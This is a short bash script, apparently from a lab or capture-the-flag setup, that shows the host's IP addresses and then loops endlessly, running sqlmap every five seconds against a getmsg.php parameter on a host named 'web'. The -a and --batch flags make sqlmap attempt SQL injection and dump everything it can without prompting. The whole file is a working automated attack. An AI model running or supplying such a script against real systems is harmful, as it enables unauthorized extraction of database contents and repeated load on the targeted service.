#!/usr/bin/bash 


ip addr 

target=web
while sleep 5
do
    sqlmap http://$target/getmsg.php?idmsg=673489 -a --batch;
    
done